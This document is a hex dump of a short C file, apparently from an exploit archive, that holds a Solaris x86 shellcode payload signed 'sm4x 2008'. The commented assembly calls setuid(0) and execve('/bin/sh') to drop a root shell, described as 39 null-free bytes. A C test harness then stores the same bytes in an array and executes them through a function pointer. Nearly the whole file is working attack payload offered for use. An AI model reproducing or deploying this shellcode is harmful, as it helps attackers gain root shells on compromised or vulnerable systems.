00000000  2f 2a 0d 0a 3b 20 73 6d  34 78 20 32 30 30 38 0d  |/*..; sm4x 2008.|
00000010  0a 3b 20 73 65 74 75 69  64 28 30 29 2c 20 65 78  |.; setuid(0), ex|
00000020  65 63 76 65 28 27 2f 62  69 6e 2f 73 68 27 2c 20  |ecve('/bin/sh', |
00000030  27 2f 62 69 6e 2f 73 68  27 2c 20 30 29 2c 0d 0a  |'/bin/sh', 0),..|
00000040  3b 20 33 39 20 62 79 74  65 73 20 4e 69 7a 7a 55  |; 39 bytes NizzU|
00000050  4c 4c 20 66 72 65 65 20  28 79 6f 75 20 6b 6e 6f  |LL free (you kno|
00000060  77 2e 2e 2e 29 0d 0a 3b  20 53 75 6e 4f 53 20 73  |w...)..; SunOS s|
00000070  6f 6c 30 31 20 35 2e 31  31 20 73 6e 76 5f 38 36  |ol01 5.11 snv_86|
00000080  20 69 38 36 70 63 20 69  33 38 36 20 69 38 36 70  | i86pc i386 i86p|
00000090  63 20 53 6f 6c 61 72 69  73 0d 0a 3b 20 71 75 69  |c Solaris..; qui|
000000a0  63 6b 20 70 6f 72 74 20  74 6f 20 64 72 6f 70 20  |ck port to drop |
000000b0  72 6f 6f 74 20 73 68 20  2d 20 20 3b 29 20 20 2d  |root sh -  ;)  -|
000000c0  20 53 75 6e 4f 53 20 69  73 20 70 77 6e 69 6a 0d  | SunOS is pwnij.|
000000d0  0a 0d 0a 67 6c 6f 62 61  6c 20 5f 73 74 61 72 74  |...global _start|
000000e0  0d 0a 5f 73 74 61 72 74  3a 0d 0a 0d 0a 78 6f 72  |.._start:....xor|
000000f0  20 20 20 20 20 65 61 78  2c 20 65 61 78 0d 0a 0d  |     eax, eax...|
00000100  0a 3b 20 2d 2d 2d 20 73  65 74 75 69 64 28 30 29  |.; --- setuid(0)|
00000110  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 70  |..push    eax..p|
00000120  75 73 68 20 20 20 20 65  61 78 0d 0a 6d 6f 76 20  |ush    eax..mov |
00000130  20 20 20 20 61 6c 2c 20  30 78 31 37 0d 0a 69 6e  |    al, 0x17..in|
00000140  74 20 20 20 20 20 30 78  39 31 0d 0a 0d 0a 3b 20  |t     0x91....; |
00000150  73 65 74 75 70 20 2f 2f  62 69 6e 2f 73 68 0d 0a  |setup //bin/sh..|
00000160  70 75 73 68 20 20 20 20  65 61 78 0d 0a 70 75 73  |push    eax..pus|
00000170  68 20 20 20 20 30 78 36  38 37 33 32 66 36 65 0d  |h    0x68732f6e.|
00000180  0a 70 75 73 68 20 20 20  20 30 78 36 39 36 32 32  |.push    0x69622|
00000190  66 32 66 0d 0a 6d 6f 76  20 20 20 20 20 65 62 78  |f2f..mov     ebx|
000001a0  2c 20 65 73 70 0d 0a 0d  0a 3b 20 2d 2d 2d 20 61  |, esp....; --- a|
000001b0  72 72 61 79 20 73 65 74  75 70 0d 0a 70 75 73 68  |rray setup..push|
000001c0  20 20 20 20 65 61 78 20  20 20 20 20 3b 20 6e 75  |    eax     ; nu|
000001d0  6c 6c 0d 0a 70 75 73 68  20 20 20 20 65 62 78 20  |ll..push    ebx |
000001e0  20 20 20 20 3b 20 2f 2f  62 69 6e 2f 73 68 0d 0a  |    ; //bin/sh..|
000001f0  6d 6f 76 20 20 20 20 20  65 64 78 2c 20 65 73 70  |mov     edx, esp|
00000200  0d 0a 0d 0a 3b 20 2d 2d  20 65 78 65 63 76 65 28  |....; -- execve(|
00000210  29 0d 0a 70 75 73 68 20  20 20 20 65 61 78 20 20  |)..push    eax  |
00000220  20 20 20 3b 20 30 0d 0a  70 75 73 68 20 20 20 20  |   ; 0..push    |
00000230  65 64 78 20 20 20 20 20  3b 20 61 72 72 61 79 20  |edx     ; array |
00000240  7b 20 22 2f 2f 62 69 6e  2f 73 68 22 2c 20 30 7d  |{ "//bin/sh", 0}|
00000250  0d 0a 70 75 73 68 20 20  20 20 65 62 78 20 20 20  |..push    ebx   |
00000260  20 20 3b 20 2f 2f 62 69  6e 2f 73 68 0d 0a 6d 6f  |  ; //bin/sh..mo|
00000270  76 20 20 20 20 20 61 6c  2c 20 30 78 33 62 0d 0a  |v     al, 0x3b..|
00000280  70 75 73 68 20 20 20 20  65 61 78 0d 0a 69 6e 74  |push    eax..int|
00000290  20 20 20 20 20 30 78 39  31 0d 0a 0d 0a 3b 20 2d  |     0x91....; -|
000002a0  2d 2d 20 65 78 69 74 0d  0a 69 6e 63 09 65 61 78  |-- exit..inc.eax|
000002b0  0d 0a 70 75 73 68 20 20  20 20 65 61 78 0d 0a 70  |..push    eax..p|
000002c0  75 73 68 20 20 20 20 65  61 78 0d 0a 69 6e 74 20  |ush    eax..int |
000002d0  20 20 20 20 30 78 39 31  0d 0a 0d 0a 2a 2f 0d 0a  |    0x91....*/..|
000002e0  0d 0a 23 69 6e 63 6c 75  64 65 20 0d 0a 0d 0a 63  |..#include ....c|
000002f0  68 61 72 20 63 6f 64 65  5b 5d 20 3d 20 20 20 22  |har code[] =   "|
00000300  5c 78 33 31 5c 78 63 30  5c 78 35 30 5c 78 35 30  |\x31\xc0\x50\x50|
00000310  5c 78 62 30 5c 78 31 37  5c 78 63 64 5c 78 39 31  |\xb0\x17\xcd\x91|
00000320  5c 78 35 30 5c 78 36 38  22 0d 0a 09 09 22 5c 78  |\x50\x68"...."\x|
00000330  36 65 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |6e\x2f\x73\x68\x|
00000340  36 38 5c 78 32 66 5c 78  32 66 5c 78 36 32 5c 78  |68\x2f\x2f\x62\x|
00000350  36 39 5c 78 38 39 22 0d  0a 09 09 22 5c 78 65 33  |69\x89"...."\xe3|
00000360  5c 78 35 30 5c 78 35 33  5c 78 38 39 5c 78 65 32  |\x50\x53\x89\xe2|
00000370  5c 78 35 30 5c 78 35 32  5c 78 35 33 5c 78 62 30  |\x50\x52\x53\xb0|
00000380  5c 78 33 62 22 0d 0a 09  09 22 5c 78 35 30 5c 78  |\x3b"...."\x50\x|
00000390  63 64 5c 78 39 31 5c 78  34 30 5c 78 35 30 5c 78  |cd\x91\x40\x50\x|
000003a0  35 30 5c 78 63 64 5c 78  39 31 22 3b 0d 0a 0d 0a  |50\xcd\x91";....|
000003b0  0d 0a 69 6e 74 20 6d 61  69 6e 28 69 6e 74 20 61  |..int main(int a|
000003c0  72 67 63 2c 20 63 68 61  72 20 2a 2a 61 72 67 76  |rgc, char **argv|
000003d0  29 20 7b 0d 0a 20 69 6e  74 20 28 2a 66 75 6e 63  |) {.. int (*func|
000003e0  29 28 29 3b 0d 0a 20 70  72 69 6e 74 66 28 22 42  |)();.. printf("B|
000003f0  79 74 65 73 3a 20 25 64  5c 6e 22 2c 20 73 69 7a  |ytes: %d\n", siz|
00000400  65 6f 66 28 63 6f 64 65  29 29 3b 0d 0a 20 66 75  |eof(code));.. fu|
00000410  6e 63 20 3d 20 28 69 6e  74 20 28 2a 29 28 29 29  |nc = (int (*)())|
00000420  20 63 6f 64 65 3b 0d 0a  20 28 69 6e 74 29 28 2a  | code;.. (int)(*|
00000430  66 75 6e 63 29 28 29 3b  0d 0a 7d                 |func)();..}|
0000043b
